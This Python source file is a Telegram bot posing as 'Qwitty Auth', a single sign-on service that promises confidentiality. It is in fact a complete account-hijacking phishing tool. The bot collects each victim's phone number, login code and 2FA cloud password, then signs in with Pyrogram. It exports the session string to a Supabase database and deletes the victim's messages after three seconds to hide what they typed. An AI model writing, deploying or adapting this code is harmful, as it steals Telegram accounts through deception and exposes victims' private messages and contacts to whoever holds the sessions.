import asyncio
import re
import os
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, Router, F, BaseMiddleware
from aiogram.types import Message, CallbackQuery
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest

from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, 
    PasswordHashInvalid, Unauthorized
)
from supabase import create_client, Client as SupabaseClient

# Переменные окружения
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
API_ID = int(os.getenv("API_ID", "123456"))
API_HASH = os.getenv("API_HASH", "YOUR_API_HASH")
SUPABASE_URL = os.getenv("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "YOUR_SUPABASE_KEY")

supabase: SupabaseClient = create_client(SUPABASE_URL, SUPABASE_KEY)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()

PYRO_CLIENTS = {}
UI_STATE = {}

class AuthStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()
    support = State()

class AutoDeleteMiddleware(BaseMiddleware):
    """Все сообщения пользователя удаляются через 3 секунды."""
    async def __call__(self, handler, event, data):
        result = await handler(event, data)
        if isinstance(event, Message) and not event.from_user.is_bot:
            asyncio.create_task(self.delete_after(event))
        return result

    async def delete_after(self, message: Message):
        await asyncio.sleep(3)
        try:
            await message.delete()
        except TelegramBadRequest:
            pass

async def edit_or_send(user_id: int, text: str, reply_markup=None):
    """
    Инлайн-интерфейс: обновляет существующее сообщение.
    Раз в сутки отправляет новое, удаляя старое, чтобы не затеряться в чате.
    """
    state = UI_STATE.get(user_id, {})
    last_msg_id = state.get("msg_id")
    last_date = state.get("date")
    today = datetime.now().strftime("%Y-%m-%d")

    if last_msg_id and last_date != today:
        try:
            await bot.delete_message(user_id, last_msg_id)
        except TelegramBadRequest:
            pass
        last_msg_id = None

    if last_msg_id:
        try:
            msg = await bot.edit_message_text(
                chat_id=user_id,
                message_id=last_msg_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=False
            )
            UI_STATE[user_id]["date"] = today
            return msg
        except TelegramBadRequest as e:
            if "not modified" in str(e).lower():
                return
            last_msg_id = None 

    msg = await bot.send_message(
        chat_id=user_id,
        text=text,
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=False
    )
    UI_STATE[user_id] = {"msg_id": msg.message_id, "date": today}
    return msg

async def get_db_user(user_id: int):
    res = supabase.table("auth_users").select("*").eq("user_id", user_id).execute()
    return res.data[0] if res.data else None

async def check_session_validity(session_string: str) -> bool:
    client = Client("temp_check", session_string=session_string, in_memory=True)
    try:
        await client.connect()
        await client.get_me()
        await client.disconnect()
        return True
    except Exception:
        return False

def get_main_menu_kb():
    builder = InlineKeyboardBuilder()
    builder.button(text="Тех. Поддержка 🛠", callback_data="support")
    return builder.as_markup()

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    user_id = message.from_user.id
    await state.clear()

    db_user = await get_db_user(user_id)
    
    if db_user and db_user.get("session_string"):
        # Проверка сессии Pyrogram
        is_valid = await check_session_validity(db_user["session_string"])
        if not is_valid:
            supabase.table("auth_users").delete().eq("user_id", user_id).execute()
            text = "⚠️ Юзербот вашего аккаунта был удален вами или сессия истекла."
            builder = InlineKeyboardBuilder()
            builder.button(text="Зарегистрироваться 📝", callback_data="start_registration")
            await edit_or_send(user_id, text, reply_markup=builder.as_markup())
            return
        
        # Повторный вход — без приветствия
        text = (
            "<b>Главное меню Qwitty Auth API</b>\n\n"
            "Ваш ключ доступа для подключения сервисов:\n"
            f"<code>{db_user['referral_key']}</code>\n\n"
            "<i>(Нажмите на код выше, чтобы скопировать его)</i>"
        )
        await edit_or_send(user_id, text, reply_markup=get_main_menu_kb())
    else:
        # Первичный запуск — сообщение с правилами
        text = "Здравствуйте! Добро пожаловать в Qwitty Auth Bot — единую систему авторизации."
        builder = InlineKeyboardBuilder()
        builder.button(text="Правила 📜", callback_data="show_rules")
        await edit_or_send(user_id, text, reply_markup=builder.as_markup())

@router.callback_query(F.data == "show_rules")
async def show_rules(cb: CallbackQuery):
    img_url = "https://dummyimage.com/800x400/1a1a1a/ffffff&text=2FA+Security+Guide"
    invisible_link = f'<a href="{img_url}">&#8203;</a>'
    
    text = (
        f"{invisible_link}"
        "<b>Правила использования сервиса Qwitty Auth:</b>\n\n"
        "1. Авторизация используется для интеграции экосистемы ботов.\n"
        "2. Сервис гарантирует полную конфиденциальность данных.\n"
        "3. Вы можете отменить доступ в любой момент через настройки Telegram.\n"
        "4. Один авторизационный ключ предназначен для одного аккаунта.\n"
        "<b>5. Для безопасности аккаунта включите облачный пароль (2FA) и привяжите почту.</b> Инструкция приведена на изображении ниже."
    )
    builder = InlineKeyboardBuilder()
    builder.button(text="Продолжить ➡️", callback_data="start_registration")
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup())
    await cb.answer()

@router.callback_query(F.data == "start_registration")
async def start_registration(cb: CallbackQuery, state: FSMContext):
    await state.set_state(AuthStates.waiting_for_phone)
    builder = InlineKeyboardBuilder().button(text="Назад 🔙", callback_data="cancel")
    text = "Укажите ваш номер телефона (буквы, пробелы и символы фильтруются автоматически):"
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup())
    await cb.answer()

@router.message(AuthStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    user_id = message.from_user.id
    # Очистка номера от букв и пробелов
    clean_phone = re.sub(r'\D', '', message.text)
    
    if len(clean_phone) < 7:
        text = "⚠️ В веденном тексте не найден корректный номер. Попробуйте ещё раз:"
        builder = InlineKeyboardBuilder().button(text="Назад 🔙", callback_data="cancel")
        await edit_or_send(user_id, text, reply_markup=builder.as_markup())
        return

    phone = f"+{clean_phone}"
    await state.update_data(phone=phone)
    
    client = Client(f"temp_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    PYRO_CLIENTS[user_id] = client
    
    try:
        await client.connect()
        sent_code = await client.send_code(phone)
        await state.update_data(phone_code_hash=sent_code.phone_code_hash)
        await state.set_state(AuthStates.waiting_for_code)
        
        text = "Код подтверждения отправлен в Telegram. Пожалуйста, введите его в чат:"
        builder = InlineKeyboardBuilder().button(text="Назад 🔙", callback_data="start_registration")
        await edit_or_send(user_id, text, reply_markup=builder.as_markup())
    except Exception as e:
        text = f"❌ Не удалось отправить код на данный номер.\n<i>Ошибка: {e}</i>"
        builder = InlineKeyboardBuilder().button(text="Назад 🔙", callback_data="cancel")
        await edit_or_send(user_id, text, reply_markup=builder.as_markup())

@router.message(AuthStates.waiting_for_code)
async def process_code(message: Message, state: FSMContext):
    user_id = message.from_user.id
    code = re.sub(r'\D', '', message.text)
    
    data = await state.get_data()
    client = PYRO_CLIENTS.get(user_id)
    
    if not client:
        await start_registration_fallback(user_id, state)
        return

    try:
        await client.sign_in(data["phone"], data["phone_code_hash"], code)
        await finalize_registration(user_id, client, state, data["phone"])
    except SessionPasswordNeeded:
        await state.set_state(AuthStates.waiting_for_password)
        text = "Ваш аккаунт защищен 2FA паролем. Введите облачный пароль:"
        builder = InlineKeyboardBuilder().button(text="Назад 🔙", callback_data="start_registration")
        await edit_or_send(user_id, text, reply_markup=builder.as_markup())
    except (PhoneCodeInvalid, PhoneCodeExpired):
        text = "❌ Неверный код авторизации или время его действия истекло. Попробуйте снова."
        builder = InlineKeyboardBuilder().button(text="Назад 🔙", callback_data="start_registration")
        await edit_or_send(user_id, text, reply_markup=builder.as_markup())
    except Exception as e:
        await edit_or_send(user_id, f"❌ Произошла ошибка: {e}")

@router.message(AuthStates.waiting_for_password)
async def process_password(message: Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()
    client = PYRO_CLIENTS.get(user_id)
    data = await state.get_data()
    
    if not client:
        await start_registration_fallback(user_id, state)
        return

    try:
        await client.check_password(password)
        await finalize_registration(user_id, client, state, data.get("phone", ""))
    except PasswordHashInvalid:
        text = "❌ Неправильный облачный пароль. Введите пароль повторно:"
        builder = InlineKeyboardBuilder().button(text="Назад 🔙", callback_data="start_registration")
        await edit_or_send(user_id, text, reply_markup=builder.as_markup())

async def finalize_registration(user_id: int, client: Client, state: FSMContext, phone: str):
    session_string = await client.export_session_string()
    await client.disconnect()
    PYRO_CLIENTS.pop(user_id, None)
    
    referral_key = f"Qy{random.randint(10000, 99999)}"
    
    # Сохранение в Supabase
    supabase.table("auth_users").upsert({
        "user_id": user_id,
        "phone": phone,
        "referral_key": referral_key,
        "session_string": session_string
    }).execute()
    
    await state.clear()
    
    text = (
        "<b>Вы успешно зарегистрировались!</b> 🎉\n\n"
        "Ваш единый реферальный ключ доступа:\n"
        f"<code>{referral_key}</code>\n\n"
        "<i>Используйте этот код для авто-входа в других сервисах нашей компании.</i>"
    )
    await edit_or_send(user_id, text, reply_markup=get_main_menu_kb())

async def start_registration_fallback(user_id: int, state: FSMContext):
    await state.clear()
    builder = InlineKeyboardBuilder().button(text="Регистрироваться 📝", callback_data="start_registration")
    await edit_or_send(user_id, "⚠️ Время ожидания истекло. Начните регистрацию заново.", reply_markup=builder.as_markup())

@router.callback_query(F.data == "support")
async def support_menu(cb: CallbackQuery, state: FSMContext):
    await state.set_state(AuthStates.support)
    text = (
        "<b>Техническая поддержка</b>\n\n"
        "Здесь вы можете оставить заявку об обнаруженных ошибках или задать вопрос. "
        "Опишите проблему в следующем сообщении:"
    )
    builder = InlineKeyboardBuilder().button(text="Назад в меню 🔙", callback_data="main_menu")
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup())
    await cb.answer()

@router.message(AuthStates.support)
async def process_support_msg(message: Message, state: FSMContext):
    user_id = message.from_user.id
    
    # Сохранение в Supabase
    supabase.table("support_tickets").insert({
        "user_id": user_id,
        "message": message.text.strip()
    }).execute()

    text = "✅ Ваша обращение зарегистрировано! Специалисты поддержки свяжутся с вами при необходимости."
    builder = InlineKeyboardBuilder().button(text="Вернуться в меню 🔙", callback_data="main_menu")
    await edit_or_send(user_id, text, reply_markup=builder.as_markup())
    await state.clear()

@router.callback_query(F.data == "main_menu")
async def main_menu(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    db_user = await get_db_user(cb.from_user.id)
    if db_user:
        text = (
            "<b>Главное меню Qwitty Auth API</b>\n\n"
            "Ваш ключ доступа:\n"
            f"<code>{db_user['referral_key']}</code>"
        )
        await edit_or_send(cb.from_user.id, text, reply_markup=get_main_menu_kb())
    else:
        await cmd_start(cb.message, state)
    await cb.answer()

@router.callback_query(F.data == "cancel")
async def cancel_action(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    client = PYRO_CLIENTS.pop(cb.from_user.id, None)
    if client:
        try:
            await client.disconnect()
        except:
            pass
    await cmd_start(cb.message, state)
    await cb.answer()

async def main():
    dp.update.middleware(AutoDeleteMiddleware())
    dp.include_router(router)
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
